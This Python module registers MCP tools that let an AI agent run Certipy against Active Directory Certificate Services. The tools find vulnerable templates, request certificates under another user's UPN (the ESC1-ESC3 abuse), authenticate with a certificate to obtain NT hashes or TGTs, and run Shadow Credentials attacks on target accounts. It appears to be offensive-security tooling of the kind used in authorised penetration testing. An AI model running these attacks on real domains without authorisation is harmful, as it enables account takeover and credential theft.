"""MCP tools for Certipy ADCS operations."""

import shlex
from .common import _run_cmd, _format_response, _find_certipy_bin, LONG_TIMEOUT


def _certipy_auth_args(username: str, domain: str, password: str = "",
                       hashes: str = "") -> str:
    """Build Certipy v5 authentication arguments (-u user@domain -p pass)."""
    args = f"-u {shlex.quote(f'{username}@{domain}')}"
    if password:
        args += f" -p {shlex.quote(password)}"
    if hashes:
        args += f" -hashes {shlex.quote(hashes)}"
    return args


def register(mcp):

    @mcp.tool()
    async def certipy_find(
        domain: str,
        username: str,
        password: str = "",
        hashes: str = "",
        dc_ip: str = "",
        target_ip: str = "",
        vulnerable: bool = True,
        output: str = "",
    ) -> str:
        """
        Run Certipy to enumerate ADCS certificate templates and find vulnerabilities.
        Detects ESC1-ESC16, misconfigured templates, CA misconfigurations.

        Args:
            domain: AD domain
            username: Username
            password: Password
            hashes: NTLM hash
            dc_ip: DC IP address for LDAP/Kerberos
            target_ip: Target IP for RPC connection (use when DNS resolves incorrectly)
            vulnerable: Only show vulnerable templates
            output: Output file prefix
        """
        certipy = _find_certipy_bin()
        cmd = f"{certipy} find {_certipy_auth_args(username, domain, password, hashes)}"
        if dc_ip:
            cmd += f" -dc-ip {shlex.quote(dc_ip)}"
        if target_ip:
            cmd += f" -target-ip {shlex.quote(target_ip)}"
        if vulnerable:
            cmd += " -vulnerable"
        if output:
            cmd += f" -output {shlex.quote(output)}"

        result = _run_cmd(cmd, LONG_TIMEOUT)
        return _format_response(data=result)

    @mcp.tool()
    async def certipy_req(
        domain: str,
        username: str,
        password: str = "",
        hashes: str = "",
        dc_ip: str = "",
        target_ip: str = "",
        ca: str = "",
        template: str = "",
        upn: str = "",
        dns: str = "",
    ) -> str:
        """
        Request a certificate from ADCS (for ESC1/ESC2/ESC3 exploitation).

        Args:
            domain: AD domain
            username: Username
            password: Password
            hashes: NTLM hash
            dc_ip: DC IP for LDAP/Kerberos
            target_ip: Target IP for RPC connection (use when DNS resolves incorrectly)
            ca: Certificate Authority name
            template: Certificate template name
            upn: Alternative UPN for the certificate
            dns: Alternative DNS name for the certificate
        """
        certipy = _find_certipy_bin()
        cmd = f"{certipy} req {_certipy_auth_args(username, domain, password, hashes)}"
        if dc_ip:
            cmd += f" -dc-ip {shlex.quote(dc_ip)}"
        if target_ip:
            cmd += f" -target-ip {shlex.quote(target_ip)}"
        if ca:
            cmd += f" -ca {shlex.quote(ca)}"
        if template:
            cmd += f" -template {shlex.quote(template)}"
        if upn:
            cmd += f" -upn {shlex.quote(upn)}"
        if dns:
            cmd += f" -dns {shlex.quote(dns)}"

        result = _run_cmd(cmd, LONG_TIMEOUT)
        return _format_response(data=result)

    @mcp.tool()
    async def certipy_auth(
        domain: str,
        username: str,
        pfx: str,
        dc_ip: str = "",
        target_ip: str = "",
    ) -> str:
        """
        Authenticate using a certificate (PFX file) to get NT hash or TGT.

        Args:
            domain: AD domain
            username: Username
            pfx: Path to PFX certificate file
            dc_ip: DC IP address
            target_ip: Target IP for PKINIT (use when DNS resolves incorrectly)
        """
        certipy = _find_certipy_bin()
        cmd = (
            f"{certipy} auth -pfx {shlex.quote(pfx)} "
            f"-username {shlex.quote(username)} "
            f"-domain {shlex.quote(domain)}"
        )
        if dc_ip:
            cmd += f" -dc-ip {shlex.quote(dc_ip)}"
        if target_ip:
            cmd += f" -target-ip {shlex.quote(target_ip)}"

        result = _run_cmd(cmd)
        return _format_response(data=result)

    @mcp.tool()
    async def certipy_shadow(
        domain: str,
        username: str,
        password: str = "",
        account: str = "",
        dc_ip: str = "",
        target_ip: str = "",
        auto: bool = True,
    ) -> str:
        """
        Shadow Credentials attack - add key credentials to a target account.

        Args:
            domain: AD domain
            username: Attacking username
            password: Password
            account: Target account to add shadow credentials to
            dc_ip: DC IP for LDAP/Kerberos
            target_ip: Target IP for RPC connection (use when DNS resolves incorrectly)
            auto: Auto mode (adds cred, requests cert, authenticates)
        """
        certipy = _find_certipy_bin()
        cmd = f"{certipy} shadow"
        if auto:
            cmd += " auto"
        cmd += f" {_certipy_auth_args(username, domain, password)}"
        if account:
            cmd += f" -account {shlex.quote(account)}"
        if dc_ip:
            cmd += f" -dc-ip {shlex.quote(dc_ip)}"
        if target_ip:
            cmd += f" -target-ip {shlex.quote(target_ip)}"

        result = _run_cmd(cmd, LONG_TIMEOUT)
        return _format_response(data=result)
